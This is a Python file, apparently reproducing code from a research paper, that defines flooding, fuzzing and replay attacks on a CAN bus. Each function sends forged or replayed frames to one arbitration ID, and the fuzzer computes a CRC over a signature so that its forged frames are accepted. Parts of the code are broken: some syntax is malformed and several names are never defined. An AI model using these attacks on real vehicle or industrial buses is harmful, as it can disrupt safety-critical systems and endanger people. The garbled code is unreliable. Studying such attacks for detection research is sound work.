import time
# from https://arxiv.org/pdf/2212.09268
def floodingAttack (endTime) :
    frame1 = [0xA6, 0x35, 0, 0, 0, 0, 0, 0x80]
    frame2 = [0, 0, 0, 0, 0, 0, 0x60]
    idx = 0

    while True:
        frame1[-1] = (idx) % 0x20 + 0x80
        frame2[-1] = (idx) % 0x20 + 0x60
        try:
            msg1 = can.Message(arbitration_id=0x05040601, data=frame1)
            msg2 = can.Message(arbitration_id=0x05040601, data=frame2)
            bus.send(msg1)
            bus.send(msg2)
        except can.CanError:
            print("Message Not Sent")
        
        time.sleep(0.005)
        idx += 1
        if time.time() > endTime:
            break

def fuzzyAttack ( endTime ) :
    sign = 0x217f5c87d7ec951d
    sign = sign.to_bytes(8, byteorder="little")
    tmp_crc = transCRC(sign)
    idx = 0

    while True:
        payload0 = [random.randint(0, 255) for x in range(5)]
        payload1 = [random.randint(0, 255) for x in range(6)]
        frame0, frame1 = data_gen(payload0, payload1, tmp_crc)
        frame0[-1] = (idx) % 0x20 + 0x80
        frame1[-1] = (idx) % 0x20 + 0x60
        try:
            msg1 = can.Message(arbitration_id=0x05040601, data=frame0)
            msg2 = can.Message(arbitration_id=0x05040601, data=frame1)
            bus.send(msg1)
            bus.send(msg2)
        except can.CanError:
            print("Message Not Sent")
        
        time.sleep(0.001)
        idx += 1
        if time.time() > endTime:
            break

def replayAttack ( endTime ) :
    idx = 0
    replayStart = time . time ()

    while True :
        while time . time () - replayStart >= frames[idx][0] - frames[0][0]:
            try :
                msg = can.Message( arbitration_id =0 x05040601 , data = frames [
                idx ][1])
                bus.send( msg )
            except can.CanError :
                print (" Message Not Send ")
        idx += 1
        if idx >= len (frames) :
            return
        if time . time () > endTime :
            break